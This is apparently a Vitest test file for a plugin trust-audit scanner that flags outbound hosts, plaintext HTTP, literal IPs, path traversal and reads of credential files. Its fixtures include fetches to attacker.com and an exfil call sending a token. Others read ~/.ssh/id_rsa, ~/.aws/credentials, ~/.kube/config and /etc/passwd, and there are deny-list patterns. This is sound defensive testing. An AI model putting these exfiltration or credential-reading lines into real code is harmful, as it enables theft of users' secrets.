import { describe, expect, it } from 'vitest'
import { auditPlugin } from '../../src/core/audit.ts'
import { MAX_DESTINATIONS, scanShape, shapeRedLines } from '../../src/core/shape.ts'
import { scoreTrust } from '../../src/core/score.ts'
import type { PluginInput } from '../../src/core/types.ts'

function input(sources: Record<string, string>): PluginInput {
  return {
    manifest: { name: 'shape-test', version: '1.0.0' },
    sources,
    skillFiles: {},
    patchText: undefined,
    patchPath: undefined,
    spec: 'dir:.',
  }
}

describe('scanShape', () => {
  it('ignores same-origin HTTP relative routes as destinations', () => {
    const { destinations, pathEscapes } = scanShape(input({
      'client.js': 'await fetch("/dsh-trust-check/audit")',
    }))
    expect(destinations.some(d => d.value === '/dsh-trust-check/audit')).toBe(false)
    expect(pathEscapes).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('records https host without red line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("https://api.github.com/repos/x")',
    }))
    expect(destinations.some(d => d.kind === 'https-host' && d.value === 'api.github.com')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('flags plaintext http host as red line when network present', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://attacker.com/leak")',
    }))
    const lines = shapeRedLines(['network'], destinations)
    expect(lines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
  })

  it('flags non-loopback literal IP with network', () => {
    // RFC1918 alone still reds; RFC 5737 docs ranges are skipped elsewhere.
    const { destinations } = scanShape(input({
      'a.js': 'const u = "192.168.1.100"',
    }))
    const lines = shapeRedLines(['network'], destinations)
    expect(lines.some(l => l.startsWith('uses literal IP'))).toBe(true)
  })

  it('skips RFC 5737 documentation IPv4 ranges (not real outbound)', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'const example = "203.0.113.10"',
        'fetch("https://203.0.113.10/x")',
        'fetch("http://192.0.2.1/x")',
        'const other = "198.51.100.50"',
      ].join('\n'),
    }))
    expect(destinations.some(d => /203\.0\.113|192\.0\.2|198\.51\.100/.test(d.value))).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('does not count a URL used only as a new URL() base (request parsing)', () => {
    const parser = scanShape(input({
      'a.js': [
        "const url = new URL(req.url, 'http://dsh-remote.local')",
        "if (url.pathname === '/fs') return",
      ].join('\n'),
    }))
    expect(parser.destinations).toEqual([])
    expect(shapeRedLines(['network'], parser.destinations)).toEqual([])

    // The same origin fetched as a string is still a destination; only the
    // base argument of a parse is exempt.
    const real = scanShape(input({
      'a.js': [
        "const u = new URL('/x', 'http://10.20.30.40')",
        "fetch('http://10.20.30.40/x')",
      ].join('\n'),
    }))
    expect(real.destinations.some(d => d.value === '10.20.30.40')).toBe(true)
  })

  it('skips CIDR network literals but still flags a /32 host', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        "if (/^10\\./.test(ip)) cidr = '10.0.0.0/8'",
        "else if (/^192\\.168\\./.test(ip)) cidr = '192.168.0.0/16'",
        "else if (/^172\\./.test(ip)) cidr = '172.16.0.0/12'",
        "else if (/^100\\./.test(ip)) cidr = '100.64.0.0/10'",
      ].join('\n'),
    }))
    expect(destinations.some(d => /^(10\.0\.0\.0|192\.168\.0\.0|172\.16\.0\.0|100\.64\.0\.0)$/.test(d.value))).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])

    const host = scanShape(input({ 'a.js': 'const u = "10.0.0.5/32"' }))
    expect(host.destinations.some(d => d.value === '10.0.0.5')).toBe(true)
    expect(shapeRedLines(['network'], host.destinations).some(l => l.startsWith('uses literal IP'))).toBe(true)
  })

  it('skips private IP range-table boundaries (SSRF denylist)', () => {
    const { destinations } = scanShape(input({
      'a.js': 'return inRange(value, "10.0.0.0", "10.255.255.255") || inRange(value, "192.168.0.0", "192.168.255.255")',
    }))
    expect(destinations.filter(d => d.kind === 'ip')).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('skips one-IP-per-line CIDR table rows', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'const PRIVATE_RANGES = [',
        '\t["10.0.0.0", 8],',
        '\t["192.168.0.0", 16],',
        '\t["172.16.0.0", 12],',
        ']',
      ].join('\n'),
    }))
    expect(destinations.filter(d => d.kind === 'ip')).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('still records a lone private literal IP used as a destination', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://192.168.1.100/x")',
    }))
    const alone = scanShape(input({ 'b.js': 'const host = "10.0.0.5"' }))
    expect(alone.destinations.some(d => d.kind === 'ip' && d.value === '10.0.0.5')).toBe(true)
    expect(destinations.some(d => d.kind === 'http-host' && d.value === '192.168.1.100')).toBe(true)
    expect(shapeRedLines(['network'], alone.destinations).some(l => l.includes('10.0.0.5'))).toBe(true)
  })

  it('does not treat ~/.ssh inside UI prose as a secret touch', () => {
    const { secretTouches } = scanShape(input({
      'a.js': 'vpsSshKeyPlaceholder: "Uses ssh-agent or ~/.ssh/config when empty",',
    }))
    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('.ssh'))).toBe(false)
  })

  it('still records path-only ~/.ssh string literals as secret touches', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'readFile("~/.ssh/config")',
        'open("~/.ssh/id_rsa")',
      ].join('\n'),
    }))
    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('.ssh'))).toBe(true)
  })

  it('records absolute and fragment .ssh path-only literals (not only tilde whole-strings)', () => {
    const abs = scanShape(input({
      'a.js': "readFileSync('/Users/victim/.ssh/config')",
    }))
    expect(abs.secretTouches.some(s => s.kind === 'path' && s.value.includes('.ssh'))).toBe(true)

    const frag = scanShape(input({
      'a.js': "readFileSync('~/' + '.ssh/config')",
    }))
    expect(frag.secretTouches.some(s => s.kind === 'path' && s.value.includes('.ssh'))).toBe(true)
  })

  it('records path-only ~/.aws/credentials literals', () => {
    const { secretTouches } = scanShape(input({
      'a.js': 'readFile("~/.aws/credentials")',
    }))
    expect(secretTouches.some(s => s.value.includes('.aws/credentials'))).toBe(true)
  })

  it('does not skip a real public IP just because it sits in a ["ip", 32] host tuple', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const DEST = ["8.8.8.8", 32],',
    }))
    expect(destinations.some(d => d.kind === 'ip' && d.value === '8.8.8.8')).toBe(true)
    expect(shapeRedLines(['network'], destinations).some(l => l.includes('8.8.8.8'))).toBe(true)
  })

  it('does not skip IPs merely because two appear on one call line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'exfil("8.8.8.8", "1.1.1.1")',
    }))
    expect(destinations.filter(d => d.kind === 'ip').map(d => d.value).sort()).toEqual(['1.1.1.1', '8.8.8.8'])
  })

  it('does not skip an IP just because PRIVATE_RANGES appears on the same line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const PRIVATE_RANGES = "8.8.8.8"',
    }))
    expect(destinations.some(d => d.value === '8.8.8.8')).toBe(true)
  })

  it('skips placeholder URL bases and example hosts', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'new URL(request.url ?? "", "http://local")',
        'fetch("https://dav.example/x")',
        'citations:["https://..."]',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === 'local' || d.value.includes('example'))).toBe(false)
    expect(destinations.some(d => d.value === '...' || /^\.+$/.test(d.value))).toBe(false)
  })

  it('skips RFC 2606 .invalid / .test hosts used as URL parser bases', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'u = new URL(reqUrl ?? "/", "http://dsh.invalid")',
        'fetch("http://fixture.test/setup")',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === 'dsh.invalid' || d.value.endsWith('.invalid'))).toBe(false)
    expect(destinations.some(d => d.value === 'fixture.test' || d.value.endsWith('.test'))).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('does not read an XML namespace identifier as a plaintext request', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        'const svg = { xmlns: "http://www.w3.org/2000/svg" }',
        'out += \'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\'',
      ].join('\n'),
    }))
    expect(destinations).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('drops doc-block example URLs, which bundlers keep in shipped output', () => {
    const { destinations } = scanShape(input({
      'a.js': [
        '/**',
        ' * Behind a reverse proxy (`https://host/app/my-dsh/`) requests went to',
        ' * `https://proxy/https://github.com/o/r.git` instead.',
        ' */',
        'export const base = document.baseURI',
      ].join('\n'),
    }))
    expect(destinations).toEqual([])
  })

  it('still reports a single-label host used for a real request', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://proxy/exfil", { body: token })',
    }))
    expect(destinations.some(d => d.kind === 'http-host' && d.value === 'proxy')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toContain('uses plaintext http:// to proxy')
  })

  it('treats RFC 2606 example.com subdomains as placeholders, not substring matches', () => {
    const docs = scanShape(input({
      'a.js': 'fetch("http://uat.example.com/login")',
    }))
    expect(docs.destinations).toEqual([])
    expect(shapeRedLines(['network'], docs.destinations)).toEqual([])

    const lookalike = scanShape(input({
      'a.js': 'fetch("http://notexample.com/exfil")',
    }))
    expect(lookalike.destinations.some(d => d.value === 'notexample.com')).toBe(true)
    expect(shapeRedLines(['network'], lookalike.destinations)).toContain('uses plaintext http:// to notexample.com')
  })

  it('does not read json-schema.org as a plaintext request', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const schema = { $schema: "http://json-schema.org/draft-07/schema#" }',
    }))
    expect(destinations).toEqual([])
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('keeps dsh.internal as a destination without a plaintext red line', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://dsh.internal/rpc")',
    }))
    expect(destinations.some(d => d.kind === 'http-host' && d.value === 'dsh.internal')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('still red-lines plaintext HTTP to a generic .local host', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch("http://fileserver.local/share")',
    }))
    expect(destinations.some(d => d.value === 'fileserver.local')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toContain('uses plaintext http:// to fileserver.local')
  })

  it('does not red-line the unspecified bind address 0.0.0.0', () => {
    const { destinations } = scanShape(input({
      'a.js': 'listen("0.0.0.0")',
    }))
    expect(destinations.some(d => d.kind === 'ip' && d.value === '0.0.0.0')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])

    const real = scanShape(input({
      'a.js': 'const host = "8.8.8.8"',
    }))
    expect(shapeRedLines(['network'], real.destinations).some(l => l.startsWith('uses literal IP'))).toBe(true)
  })

  it('does not red-line limited-broadcast 255.255.255.255', () => {
    const { destinations } = scanShape(input({
      'a.js': 'const mask = "255.255.255.255"',
    }))
    expect(destinations.some(d => d.value === '255.255.255.255')).toBe(true)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('skips single-character documentation hosts but not proxy', () => {
    const stub = scanShape(input({
      'a.js': 'fetch("http://x/placeholder")',
    }))
    expect(stub.destinations.some(d => d.value === 'x')).toBe(false)
    expect(shapeRedLines(['network'], stub.destinations)).toEqual([])
  })

  it('keeps the riskiest destinations when padding overflows the cap', () => {
    const padding = Array.from(
      { length: MAX_DESTINATIONS + 5 },
      (_, i) => `const u${i} = "https://cdn${i}.github.io/x"`,
    )
    const { destinations } = scanShape(input({
      'a.js': [...padding, 'fetch("http://8.8.8.8/exfil")'].join('\n'),
    }))
    expect(destinations).toHaveLength(MAX_DESTINATIONS)
    expect(destinations.some(d => d.value === '8.8.8.8')).toBe(true)
    expect(shapeRedLines(['network'], destinations).length).toBeGreaterThan(0)
  })

  it('records filesystem absolute paths as path escapes, not destinations', () => {
    const { destinations, pathEscapes } = scanShape(input({
      'a.js': [
        "spawn(COMSPEC, ['/d', '/s', '/c', cmd])",
        "dirs.push('/opt/homebrew/bin', '/usr/local/bin')",
        'await fetch("/dsh-market/check")',
        'readFileSync("/Users/alice/.config/secret")',
        'open("~/Documents/x")',
        'join("../../../etc/passwd")',
      ].join('\n'),
    }))
    expect(destinations.some(d => d.value === '/c' || d.value.startsWith('/opt/') || d.value.startsWith('/usr/'))).toBe(false)
    expect(destinations.some(d => d.value === '/dsh-market/check')).toBe(false)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value === '/opt/homebrew/bin')).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value === '/usr/local/bin')).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'absolute' && p.value.startsWith('/Users/'))).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'home' && p.value.startsWith('~/'))).toBe(true)
    expect(pathEscapes.some(p => p.kind === 'traversal')).toBe(true)
  })

  it('skips template http hosts that are not literals', () => {
    const { destinations } = scanShape(input({
      'a.js': 'fetch(`http://${host}/x`)',
    }))
    expect(destinations.some(d => d.kind === 'http-host')).toBe(false)
    expect(shapeRedLines(['network'], destinations)).toEqual([])
  })

  it('captures sensitive env key names', () => {
    const { secretTouches } = scanShape(input({
      'a.js': 'const k = process.env.OPENAI_API_KEY',
    }))
    expect(secretTouches.some(s => s.kind === 'env-key' && s.value === 'OPENAI_API_KEY')).toBe(true)
  })

  it('captures Kubernetes, Docker, and GnuPG credential paths', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'readFile("~/.kube/config")',
        'readFile("~/.docker/config.json")',
        'readFile("~/.gnupg/private-keys-v1.d")',
      ].join('\n'),
    }))
    expect(secretTouches.filter(s => s.kind === 'path').map(s => s.value)).toEqual([
      '.kube/config',
      '.docker/config.json',
      '.gnupg/',
    ])
  })

  it('does not flag generic credential words or filenames', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'const names = ["kubernetes", "docker", "config.json"]',
        'readFile("config.json")',
      ].join('\n'),
    }))
    expect(secretTouches).toEqual([])
  })

  it('does not treat deny-list id_rsa / .netrc string literals as secret touches', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        "if (base.startsWith('id_rsa')) return true",
        String.raw`const deny = "pwsh((?:\\.ssh[/\\\\]id_rsa|id_ed25519|\\.netrc))"`,
        String.raw`"write,edit(\\.credentials\\.ya?ml|id_rsa|id_ed25519|\\.netrc)"`,
      ].join('\n'),
    }))
    expect(secretTouches).toEqual([])
  })

  it('still records path-shaped id_rsa and .netrc touches', () => {
    const { secretTouches } = scanShape(input({
      'a.js': [
        'readFileSync("/home/u/.ssh/id_rsa")',
        'readFile("~/.netrc")',
        'open("./.netrc")',
      ].join('\n'),
    }))
    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('id_rsa'))).toBe(true)
    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('.netrc'))).toBe(true)
  })

  it('does not treat a deny-list array entry [\'.netrc\'] as a secret touch', () => {
    const { secretTouches } = scanShape(input({
      'a.js': "const deny = ['.netrc', '.ssh', 'id_rsa']",
    }))
    expect(secretTouches).toEqual([])
  })
})

describe('auditPlugin shape integration', () => {
  it('treats same-origin relative fetch as non-egress: no network capability, no destination', () => {
    const report = auditPlugin(input({
      'client.js': [
        'import { readFileSync } from "fs"',
        'await fetch("/dsh-trust-check/audit")',
      ].join('\n'),
    }))
    expect(report.capabilities).not.toContain('network')
    expect(report.destinations.some(d => d.value === '/dsh-trust-check/audit')).toBe(false)
    expect(report.pathEscapes.some(p => p.value === '/dsh-trust-check/audit')).toBe(false)
    expect(report.redLines).toEqual([])
  })

  it('surfaces path escapes in the report', () => {
    const report = auditPlugin(input({
      'a.js': 'readFileSync("/etc/passwd")',
    }))
    expect(report.pathEscapes.some(p => p.kind === 'absolute' && p.value === '/etc/passwd')).toBe(true)
  })

  it('red-lines http evil host with network', () => {
    const report = auditPlugin(input({
      'a.js': 'fetch("http://attacker.com/x")',
    }))
    expect(report.redLines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
    expect(report.band).toBe('red')
  })
})

describe('scoreTrust destinations', () => {
  it('merges shape red lines', () => {
    const result = scoreTrust({
      capabilities: ['network'],
      destinations: [{ kind: 'http-host', value: 'attacker.com', file: 'a.js', line: 1 }],
      injectedTokensEstimate: 0,
      injections: [],
      hasBuildScript: false,
      buildScripts: [],
      prepareScripts: [],
      repository: 'https://github.com/x/y',
      pinned: true,
    })
    expect(result.redLines.some(l => l.includes('attacker.com'))).toBe(true)
  })
})
